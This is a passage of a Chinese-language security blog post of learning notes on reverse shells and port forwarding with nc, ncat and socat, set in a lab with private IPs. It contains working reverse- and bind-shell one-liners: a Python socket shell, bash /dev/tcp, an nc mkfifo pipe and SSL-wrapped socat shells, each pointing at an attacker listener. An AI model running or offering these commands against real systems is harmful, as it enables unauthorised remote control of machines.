+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import os,socket,subprocess</span><br><span class="line"></span><br><span class="line">s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">s.connect((&#39;192.168.40.228&#39;,8888))  </span><br><span class="line">os.dup2(s.fileno(),0)</span><br><span class="line">os.dup2(s.fileno(),1)</span><br><span class="line">os.dup2(s.fileno(),2)</span><br><span class="line">p&#x3D;subprocess.call([&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-i&#39;])</span><br></pre></td></tr></table></figure>
+
+<h3 id="ncat"><a href="#ncat" class="headerlink" title="ncat"></a>ncat</h3><p>正向</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ncat -c bash --allow 192.168.1.2 -vnl 333 --ssl</span><br></pre></td></tr></table></figure>
+
+<h3 id="socat"><a href="#socat" class="headerlink" title="socat"></a>socat</h3><p>攻击机IP：192.168.2.84</p>
+<p>受害机IP：192.168.3.76</p>
+<h4 id="简易聊天窗口"><a href="#简易聊天窗口" class="headerlink" title="简易聊天窗口"></a>简易聊天窗口</h4><p>服务端</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat - tcp-listen:1234</span><br></pre></td></tr></table></figure>
+
+<p>客户端</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat tcp4:192.168.2.84:1234 -</span><br></pre></td></tr></table></figure>
+
+<p><code>-</code>,<code>STDIN</code>,<code>STDOUT</code> 表示标准输入输出，可以用一个横杠代替。</p>
+<h4 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h4><p>下面的<code>STDIN</code>表示标准输入和用一个<code>-</code>效果一样的</p>
+<p>服务端通过管道符将<code>cat svmgrsvc.log</code>的输出作为标准输入传递给socat</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat svmgrsvc.log|socat tcp-listen:1234 STDIN</span><br></pre></td></tr></table></figure>
+
+<p>客户端</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat tcp4:192.168.2.84:1234 STDOUT</span><br></pre></td></tr></table></figure>
+
+<p>如果要将服务端传过来的数据保存成文件的话，不能直接使用管道符或者是重定向</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">socat tcp4:192.168.2.84:1234 file:&#x2F;tmp&#x2F;c.txt,</span><br><span class="line">create</span><br></pre></td></tr></table></figure>
+
+<p>将程序/脚本输出传递也是一样的啦</p>
+<p>服务端</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -ef|socat tcp-listen:1234 STDIN</span><br></pre></td></tr></table></figure>
+
+<p>客户端</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat tcp4:192.168.2.84:1234 file:&#x2F;tmp&#x2F;f.txt,create</span><br></pre></td></tr></table></figure>
+
+<h5 id="传输文件-1"><a href="#传输文件-1" class="headerlink" title="传输文件"></a>传输文件</h5><p>服务端</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat tcp-listen:1234,fork file:&#x2F;tmp&#x2F;DidFinish.txt</span><br></pre></td></tr></table></figure>
+
+<p>客户端</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat tcp4:192.168.2.84:1234 file:&#x2F;tmp&#x2F;b.txt,create</span><br></pre></td></tr></table></figure>
+
+<h5 id="传递目录"><a href="#传递目录" class="headerlink" title="传递目录"></a>传递目录</h5><p>服务端</p>
+<p>这里<code>tar</code>的<code>-</code>也可以替换为<code>STDOUT</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar cvf - .&#x2F;aaa | socat TCP4-LISTEN:1234 STDIN</span><br></pre></td></tr></table></figure>
+
+<p>客户端</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat tcp4:192.168.2.84:1234 file:&#x2F;tmp&#x2F;f.tar,create</span><br></pre></td></tr></table></figure>
+
+<h5 id="读写分流"><a href="#读写分流" class="headerlink" title="读写分流"></a>读写分流</h5><p>实现一个假的 Web Server，客户端连过来之后就把 read.html 里面的内容传过去，同时把客户端的数据保存到 write.txt 里面。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat open:read.html\!\!open:write.txt,create,append tcp-listen:8000,reuseaddr,fork</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://images.atsud0.me/images/post/image-20201126132609324.png" alt="image-20201126132609324"></p>
+<h4 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat  TCP4-LISTEN:1234,bind&#x3D;127.0.0.1,reuseaddr,fork TCP4:192.168.3.74:22</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>bind 绑定监听的ip，不对其进行绑定的话则默认为0.0.0.0</p>
+<p>Reuseaddr绑定一个本地端口</p>
+<p>fork TCP4:&lt;ip address&gt;:&lt;port&gt; 转发到的服务器ip和端口</p>
+</blockquote>
+<h4 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h4><h5 id="反向-1"><a href="#反向-1" class="headerlink" title="反向"></a>反向</h5><p>攻击机执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat -d -d TCP4-LISTEN:1234 STDOUT</span><br></pre></td></tr></table></figure>
+
+<p>受害机执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat TCP:192.168.2.84:1233 EXEC:&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>
+
+<p>这样就打开了一个简易的<code>shell</code>，但是没有标准错误输出。取决于在受害机上执行的反弹命令</p>
+<p>攻击机器执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">socat file:&#96;tty&#96;,raw,echo&#x3D;0 tcp-listen:1234</span><br><span class="line"></span><br><span class="line">### 下面这条也行，取决于在受害机上执行的反弹命令</span><br><span class="line">socat TCP4-LISTEN:1234 STDOUT</span><br></pre></td></tr></table></figure>
+
+<p>受害机执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">socat exec:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane tcp:192.168.2.84:1234</span><br><span class="line"></span><br><span class="line">或者用正常的来弹回去也行</span><br><span class="line">bash -c &#39;bash &gt;&amp;&#x2F;dev&#x2F;tcp&#x2F;192.168.2.84&#x2F;1233 0&gt;&amp;1&#39;</span><br></pre></td></tr></table></figure>
+
+<p>这样反弹回来的shell，是标准的终端属性。</p>
+<p>在受害机上用<code>socat</code>反弹shell时，只要携带<code>stderr</code>这个参数，就有标准错误输出了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat TCP:192.168.2.84:1233 EXEC:&#x2F;bin&#x2F;bash,stderr</span><br></pre></td></tr></table></figure>
+
+<h5 id="正向-1"><a href="#正向-1" class="headerlink" title="正向"></a>正向</h5><p>受害机执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat TCP-LISTEN:1234 EXEC:&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>
+
+<p>攻击机执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat - TCP:192.168.3.76:1234</span><br></pre></td></tr></table></figure>
+
+<p>攻击机收到的shell有没有标准错误输出什么的，这里就取决于受害机的监听命令了 同样，带上个<code>stderr</code>就好了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat TCP-LISTEN:1235 EXEC:&#x2F;bin&#x2F;bash,stderr</span><br></pre></td></tr></table></figure>
+
+<h4 id="SOCAT加密传输"><a href="#SOCAT加密传输" class="headerlink" title="SOCAT加密传输"></a>SOCAT加密传输</h4><p>创建key</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">openssl req -newkey rsa:2048 -nodes -keyout atsud0.key -x509 -days 362 -out atsud0.crt</span><br><span class="line"></span><br><span class="line">cat atsud0.key atsud0.crt &gt;atsud0.pem</span><br></pre></td></tr></table></figure>
+
+<p>开启加密监听</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat openssl-listen:1234,cert&#x3D;atsud0.pem,verify&#x3D;0 -</span><br></pre></td></tr></table></figure>
+
+<p>如果监听用的是openssl加密，而客户端则不用的话是不能连接上的。其余用法大致和tcp一样。</p>
+<p>客户端</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat - openssl:192.168.2.84:1235,verify&#x3D;0</span><br></pre></td></tr></table></figure>
+
+<p>客户端反弹shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat openssl:192.168.2.84:1234,verify&#x3D;0 exec:&#x2F;bin&#x2F;bash,stderr</span><br></pre></td></tr></table></figure>
+
+<h4 id="socat和nc一起用"><a href="#socat和nc一起用" class="headerlink" title="socat和nc一起用"></a>socat和nc一起用</h4><p>socat 监听</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat tcp-listen:1234 -</span><br></pre></td></tr></table></figure>
+
+<p>用nc反弹shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 192.168.2.84 1234 &gt;&#x2F;tmp&#x2F;f</span><br></pre></td></tr></table></figure>
+
+<p>是可以用的。。</p>
+<p>socat正向shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat TCP-LISTEN:1234 EXEC:&#x2F;bin&#x2F;bash,stderr</span><br></pre></td></tr></table></figure>
+
+<p>Nc 去连接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nv 192.168.2.84 1234</span><br></pre></td></tr></table></figure>
+
+<p>这样也是可以的</p>
+<h4 id="本节参考链接-1"><a href="#本节参考链接-1" class="headerlink" title="本节参考链接"></a>本节参考链接</h4><ul>
+<li><p><a href="https://www.cnblogs.com/LittleHann/p/12038070.html#_lab2_3_3" target="_blank" rel="noopener">反弹shell研究</a></p>
+</li>
+<li><p><a href="https://www.hi-linux.com/posts/61543.html" target="_blank" rel="noopener">socat入门教程</a></p>
+</li>
+</ul>
+<h3 id="frp"><a href="#frp" class="headerlink" title="frp"></a>frp</h3><p>服务端：frps</p>
+<p>客户端：frpc</p>
+<p>参考</p>
+<p><a href="https://gofrp.org/docs/features/common/network/network/" target="_blank" rel="noopener">https://gofrp.org/docs/features/common/network/network/</a></p>
+<p><a href="https://sspai.com/post/52523" target="_blank" rel="noopener">https://sspai.com/post/52523</a></p>
+<p><a href="https://www.anquanke.com/post/id/184855#h3-4" target="_blank" rel="noopener">https://www.anquanke.com/post/id/184855#h3-4</a></p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>atsud0
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="http://atsud0.me/2020/04/24/netcat-socat%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="反弹Shell方式以及端口转发">http://atsud0.me/2020/04/24/netcat-socat学习笔记/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/nc/" rel="tag"><i class="fa fa-tag"></i> nc</a>
+              <a href="/tags/ncat/" rel="tag"><i class="fa fa-tag"></i> ncat</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/04/24/TryHackMe-Ice/" rel="prev" title="TryHackMe-Ice">
+      <i class="fa fa-chevron-left"></i> TryHackMe-Ice
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/04/24/%E7%AC%94%E8%AE%B0/" rel="next" title="笔记">
+      笔记 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#ICMP-Shell"><span class="nav-number">1.</span> <span class="nav-text">ICMP-Shell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-准备工作"><span class="nav-number">1.1.</span> <span class="nav-text">0x01 准备工作</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-实验"><span class="nav-number">1.2.</span> <span class="nav-text">0x02 实验</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Windows"><span class="nav-number">1.2.1.</span> <span class="nav-text">Windows</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#powershell-reverse-icmp-shell"><span class="nav-number">1.2.2.</span> <span class="nav-text">powershell reverse icmp shell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Linux"><span class="nav-number">1.2.3.</span> <span class="nav-text">Linux</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ish"><span class="nav-number">1.2.4.</span> <span class="nav-text">ish</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-总结"><span class="nav-number">1.3.</span> <span class="nav-text">0x03 总结</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#本节参考链接"><span class="nav-number">1.4.</span> <span class="nav-text">本节参考链接</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#nc"><span class="nav-number">1.5.</span> <span class="nav-text">nc</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#传输文本信息"><span class="nav-number">1.5.1.</span> <span class="nav-text">传输文本信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#利用nc进行收集信息"><span class="nav-number">1.5.2.</span> <span class="nav-text">利用nc进行收集信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#传输文件"><span class="nav-number">1.5.3.</span> <span class="nav-text">传输文件</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#加密传输文件"><span class="nav-number">1.5.3.1.</span> <span class="nav-text">加密传输文件</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#传输目录"><span class="nav-number">1.5.4.</span> <span class="nav-text">传输目录</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#加密传输目录"><span class="nav-number">1.5.4.1.</span> <span class="nav-text">加密传输目录</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#流媒体服务器"><span class="nav-number">1.5.5.</span> <span class="nav-text">流媒体服务器</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#扫端口"><span class="nav-number">1.5.6.</span> <span class="nav-text">扫端口</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#远程控制"><span class="nav-number">1.5.7.</span> <span class="nav-text">远程控制</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#正向"><span class="nav-number">1.5.7.1.</span> <span class="nav-text">正向</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#反向"><span class="nav-number">1.5.7.2.</span> <span class="nav-text">反向</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#反弹shell"><span class="nav-number">1.5.8.</span> <span class="nav-text">反弹shell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#python反弹"><span class="nav-number">1.5.9.</span> <span class="nav-text">python反弹</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ncat"><span class="nav-number">1.6.</span> <span class="nav-text">ncat</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#socat"><span class="nav-number">1.7.</span> <span class="nav-text">socat</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#简易聊天窗口"><span class="nav-number">1.7.1.</span> <span class="nav-text">简易聊天窗口</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#文件操作"><span class="nav-number">1.7.2.</span> <span class="nav-text">文件操作</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#传输文件-1"><span class="nav-number">1.7.2.1.</span> <span class="nav-text">传输文件</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#传递目录"><span class="nav-number">1.7.2.2.</span> <span class="nav-text">传递目录</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#读写分流"><span class="nav-number">1.7.2.3.</span> <span class="nav-text">读写分流</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#端口转发"><span class="nav-number">1.7.3.</span> <span class="nav-text">端口转发</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#shell"><span class="nav-number">1.7.4.</span> <span class="nav-text">shell</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#反向-1"><span class="nav-number">1.7.4.1.</span> <span class="nav-text">反向</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#正向-1"><span class="nav-number">1.7.4.2.</span> <span class="nav-text">正向</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SOCAT加密传输"><span class="nav-number">1.7.5.</span> <span class="nav-text">SOCAT加密传输</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#socat和nc一起用"><span class="nav-number">1.7.6.</span> <span class="nav-text">socat和nc一起用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#本节参考链接-1"><span class="nav-number">1.7.7.</span> <span class="nav-text">本节参考链接</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#frp"><span class="nav-number">1.8.</span> <span class="nav-text">frp</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="atsud0"
+      src="https://images.atsud0.me/images/atsud0-avator.jpg">
+  <p class="site-author-name" itemprop="name">atsud0</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">128</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/index.html">
+          
+        <span class="site-state-item-count">166</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/atsud0" title="GitHub → https://github.com/atsud0" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:admin@atsud0.me" title="E-Mail → mailto:admin@atsud0.me"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/atsud0" title="Twitter → https://twitter.com/atsud0" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://t.me/MindworkshopBot" title="Telegram → https://t.me/MindworkshopBot" rel="noopener" target="_blank"><i class="fab fa-telegram fa-fw"></i>Telegram</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.ajin.cloud/" title="https://blog.ajin.cloud/" rel="noopener" target="_blank">ajin</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://leiblog.wang/" title="https://leiblog.wang/" rel="noopener" target="_blank">LeiWang</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://esonhugh.github.io/" title="https://esonhugh.github.io/" rel="noopener" target="_blank">Esonhugh</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://isabellainori.github.io/" title="https://isabellainori.github.io/" rel="noopener" target="_blank">Isabella Ross</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2020 – 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">atsud0</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">Symbols count total: </span>
+    <span title="Symbols count total">407k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">Reading time total &asymp;</span>
+    <span title="Reading time total">6:10</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
